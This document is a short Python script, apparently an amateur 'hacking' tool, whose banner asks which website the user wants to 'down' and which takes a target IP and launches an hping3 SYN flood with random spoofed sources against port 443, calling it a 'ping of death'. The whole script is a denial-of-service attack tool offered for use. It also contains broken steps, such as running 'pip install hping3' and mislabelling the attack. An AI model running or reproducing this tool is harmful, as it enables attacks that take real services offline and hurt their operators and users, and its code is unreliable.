import subprocess
from time import sleep
from colorama import Fore

banner = Fore.GREEN + """
##########################
#------------------------#
#-  Welcome Dear Hacker -#
#-  I'm from Nasa team  -#
#-   -- This is M4 --   -#
#- which website do you -#
#-  want to down today? -#
#------------------------#
##########################
"""
print(banner)
print(Fore.RED + 'This Tool will attack by PoD (ping of Death)')

k = input(Fore.RED + 'Enter Torget ip: ')
try:
    subprocess.run('pip install hping3')
    subprocess.run(f'hping3 -V -c 1000000 -d 120 -S -w 64 -p 443 --flood --rand-source {k}', shell=True)
except:
    print('somthing gose wrong.......')